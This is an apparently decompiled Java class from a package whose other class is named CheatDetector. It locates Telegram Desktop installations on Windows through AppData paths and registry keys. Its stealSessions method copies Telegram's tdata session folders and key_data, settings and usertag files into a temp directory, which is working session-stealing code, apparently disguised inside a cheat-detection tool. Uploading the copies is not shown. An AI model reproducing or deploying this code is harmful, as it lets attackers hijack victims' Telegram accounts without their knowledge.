package bro.impl;

import bro.CheatDetector;
import bro.utilities.OSUtility;
import com.sun.jna.platform.win32.Advapi32Util;
import com.sun.jna.platform.win32.WinReg;
import java.io.File;
import java.nio.file.DirectoryStream;
import java.nio.file.Files;
import java.nio.file.LinkOption;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardCopyOption;
import java.util.ArrayList;
import java.util.Objects;

public class Telegram {
   public static File DIR;
   public static final String[] ROOT_REGISTRY;
   public static final String[] USER_REGISTRY;

   public static String formatString(String var0) {
      if (var0.startsWith("\"")) {
         if ((var0 = var0.substring(1)).endsWith(",1\"")) {
            var0 = var0.replace(",1\"", "");
         } else if (var0.endsWith("\"  -- \"%1\"")) {
            var0 = var0.replace("\"  -- \"%1\"", "");
         }
      }

      return var0;
   }

   public static ArrayList scanForTelegramApps() {
      ArrayList var0 = new ArrayList();

      try {
         File var3 = new File(OSUtility.ROAMING_APPDATA + "Telegram Desktop\\Telegram.exe");
         if (var3.exists()) {
            var0.add(var3.getAbsolutePath());
         }

         String[] var4 = ROOT_REGISTRY;
         int var5 = ROOT_REGISTRY.length;

         String var1;
         String var2;
         int var6;
         for(var6 = 0; var6 < var5; var6++) {
            var2 = var4[var6];
            var1 = Advapi32Util.registryGetStringValue(WinReg.HKEY_CLASSES_ROOT, var2, "");
            if (!var0.contains(var1 = formatString(var1))) {
               var0.add(var1);
            }
         }

         var4 = USER_REGISTRY;
         var5 = USER_REGISTRY.length;

         for(var6 = 0; var6 < var5; var6++) {
            var2 = var4[var6];
            var1 = Advapi32Util.registryGetStringValue(WinReg.HKEY_CURRENT_USER, var2, "");
            if (!var0.contains(var1 = formatString(var1))) {
               var0.add(var1);
            }
         }

         return var0;
      } catch (Exception var7) {
         return new ArrayList<>();
      }
   }

   public static boolean isTelegramFolder(File var0) {
      return (new File(var0, "tdata")).exists();
   }

   public static void vildanEblan(Path var0, Path var1) throws Throwable {
      if (Files.isDirectory(var0)) {
         if (!Files.exists(var1)) {
            Files.createDirectory(var1);
         }

         DirectoryStream<Path> var2 = Files.newDirectoryStream(var0);
         Throwable var3 = null;

         try {

             for (Path var5 : var2) {
                 Path var6 = var0.resolve(var5.getFileName());
                 Path var7 = var1.resolve(var5.getFileName());
                 vildanEblan(var6, var7);
             }
         } catch (Throwable var15) {
            var3 = var15;
            throw var15;
         } finally {
            if (var2 != null) {
               if (var3 != null) {
                  try {
                     var2.close();
                  } catch (Throwable var14) {
                     var3.addSuppressed(var14);
                  }
               } else {
                  var2.close();
               }
            }

         }
      } else {
         Files.copy(var0, var1, StandardCopyOption.REPLACE_EXISTING);
      }

   }

   public static void stealSessions() {
      int var0 = 0;

       for (Object var2 : scanForTelegramApps()) {
           try {
               if (var0 > 0) {
                   DIR = new File(CheatDetector.TEMP_DIRECTORY, "tdata" + var0 + "\\");
               }

               if (!DIR.exists()) {
                   DIR.mkdir();
               }

               File var3;
               if (isTelegramFolder(var3 = (new File((String) var2)).getParentFile())) {
                   var3 = new File(var3, "tdata");
                   File[] var4 = Objects.requireNonNull(var3.listFiles());

                   for (File var8 : var4) {
                       if (var8.isDirectory() && var8.getName().length() == 16) {
                           vildanEblan(var8.toPath(), Paths.get(DIR.getAbsolutePath() + "\\" + var8.getName()));
                       }

                       String var7;
                       if (var8.isFile() && ((var7 = var8.getName()).endsWith("s") && var7.length() == 17 || var7.startsWith("usertag") || var7.startsWith("settings") || var7.startsWith("key_data"))) {
                           Files.copy(var8.toPath(), Paths.get(DIR.getAbsolutePath() + "\\" + var8.getName()), StandardCopyOption.REPLACE_EXISTING);
                       }
                   }
                   var0++;
               }
           } catch (Throwable ignored) {}
       }

   }

   static {
      DIR = new File(CheatDetector.TEMP_DIRECTORY, "\\tdata\\");
      ROOT_REGISTRY = new String[]{"tdesktop.tg\\shell\\open\\command", "tg\\DefaultIcon", "tg\\shell\\open\\command"};
      USER_REGISTRY = new String[]{"SOFTWARE\\Classes\\tdesktop.tg\\DefaultIcon", "SOFTWARE\\Classes\\tdesktop.tg\\shell\\open\\command", "SOFTWARE\\Classes\\tg\\DefaultIcon", "SOFTWARE\\Classes\\tg\\shell\\open\\command"};
   }
}
